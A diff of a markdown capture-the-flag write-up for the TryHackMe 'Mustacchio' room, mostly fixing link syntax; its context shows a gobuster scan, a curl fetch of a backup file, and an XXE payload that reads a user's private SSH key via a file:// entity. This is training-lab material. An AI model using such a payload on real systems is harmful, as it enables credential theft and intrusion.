@@ -1,5 +1,5 @@
 
-# THM ![Mustacchio](#https://tryhackme.com/r/room/mustacchio) (Novice writeup) 
+# THM [Mustacchio](https://tryhackme.com/r/room/mustacchio) (Novice writeup) 
 - **Description**: Easy boot2root Machine
 - **Level**: easy
 - **Category**: Web/Linux
@@ -66,7 +66,7 @@ Nmap done: 1 IP address (1 host up) scanned in 157.04 seconds
 
 ## Directory listing
 ```bash
-gobuster dir -u http://mustacchio.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -o /home/l0n3m4n/tools/ctf/thm/easy/mustacchio/gobuster.txt
+$ gobuster dir -u http://mustacchio.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -o /home/l0n3m4n/tools/ctf/thm/easy/mustacchio/gobuster.txt
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -220,7 +220,7 @@ $ curl http://mustacchio.thm:8765/auth/dontforget.bak -o barry.bak
         Sanitize XPath queries and consider using parameterized queries to mitigate this risk.
  
 ## XXE vulnerability payload
-> found in ![hacktricks](#https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
+> found in ![hacktricks](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
 ```xml
 <!--?xml version="1.0" ?-->
 <!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa"> ]>
@@ -230,7 +230,7 @@ $ curl http://mustacchio.thm:8765/auth/dontforget.bak -o barry.bak
   <com>&xxe;</com>
 </comment>
 ```
-> Burpsuite tutorial ![free course Udemy](#https://www.udemy.com/course/mastering-burp-suite/?srsltid=AfmBOorTKbmBVMgEXvSt9Fgo66sRaZCq2F65tdCL4CoaZ0EhqQrYSTxt)
+> Burpsuite tutorial [free course Udemy](https://www.udemy.com/course/mastering-burp-suite/?srsltid=AfmBOorTKbmBVMgEXvSt9Fgo66sRaZCq2F65tdCL4CoaZ0EhqQrYSTxt)
 ![burp](burp.png)
 
 ## SSH Cracking
@@ -335,7 +335,7 @@ $ barry@mustacchio:/home/joe$ ./live_log
 
 ```
 ## Investigating printable strings
-> Linux builtin tools ![tutorials](#https://www.tutorialspoint.com/unix_commands/builtin.htm)
+> Linux builtin tools [tutorials](https://www.tutorialspoint.com/unix_commands/builtin.htm)
 ```bash
 $ barry@mustacchio:/home/joe$ strings live_log
 /lib64/ld-linux-x86-64.so.2
